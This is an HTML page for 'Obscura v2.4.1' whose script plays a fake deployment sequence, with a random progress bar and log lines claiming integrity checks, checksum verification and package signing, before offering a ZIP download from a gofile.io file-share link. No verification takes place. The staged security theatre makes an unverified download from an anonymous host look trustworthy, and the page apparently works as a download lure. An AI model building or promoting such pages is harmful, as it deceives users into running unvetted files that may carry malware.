<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deploy Obscura</title>
    <style>
        :root {
            --bg: #000000;
            --accents-1: #111111;
            --accents-2: #333333;
            --text-main: #ffffff;
            --text-mute: #888888;
            --geist-blue: #0070f3;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: 'Inter', -apple-system, sans-serif;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; min-height: 100vh; padding: 20px;
        }

        .deploy-card {
            width: 100%; max-width: 500px;
            background: var(--accents-1);
            border: 1px solid var(--accents-2);
            border-radius: 12px; padding: 40px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
        }

        h2 { font-size: 1.5rem; letter-spacing: -0.5px; margin-bottom: 12px; }
        p { color: var(--text-mute); font-size: 0.95rem; margin-bottom: 32px; }

        .loader-box { margin: 24px 0; }
        .bar-bg { width: 100%; height: 2px; background: var(--accents-2); border-radius: 2px; overflow: hidden; }
        .bar-fill { height: 100%; width: 0%; background: #fff; transition: width 0.3s ease; }

        .log-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-mute); margin-bottom: 8px; }

        .btn-deploy {
            width: 100%; background: #fff; color: #000;
            padding: 12px; border-radius: 6px; font-weight: 600;
            border: none; cursor: pointer; transition: 0.2s;
        }

        .btn-deploy:hover { filter: brightness(0.9); }
        .hidden { display: none; }
        .success-icon { color: var(--geist-blue); margin-bottom: 16px; font-size: 2rem; }

        a.btn-final {
            display: block; text-align: center; text-decoration: none;
            background: var(--geist-blue); color: #fff;
            padding: 12px; border-radius: 6px; font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="deploy-card">
        <div id="step-1">
            <h2>Ready to Deploy</h2>
            <p>You are about to download Obscura v2.4.1. This build has been optimized for your environment.</p>
            <button class="btn-deploy" onclick="startDeployment()">Initialize Deployment</button>
        </div>

        <div id="step-2" class="hidden">
            <div class="log-text" id="log">checking_integrity...</div>
            <div class="loader-box">
                <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
            </div>
            <p style="font-size: 12px;">Compiling static assets from production clusters...</p>
        </div>

        <div id="step-3" class="hidden" style="text-align: center;">
            <div class="success-icon">✓</div>
            <h2>Deployment Ready</h2>
            <p>The manifest has been generated successfully.</p>
            <a href="https://gofile.io/d/jYQdZY" class="btn-final">Download ZIP</a>
        </div>
    </div>

    <script>
        function startDeployment() {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');

            const logs = ["fetching_binaries...", "verifying_checksums...", "signing_package...", "ready."];
            const fill = document.getElementById('fill');
            const log = document.getElementById('log');
            let progress = 0;

            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    setTimeout(() => {
                        document.getElementById('step-2').classList.add('hidden');
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 500);
                }
                fill.style.width = progress + '%';
                
                if (progress > 25) log.innerText = logs[0];
                if (progress > 50) log.innerText = logs[1];
                if (progress > 80) log.innerText = logs[2];
            }, 300);
        }
    </script>
</body>
</html>
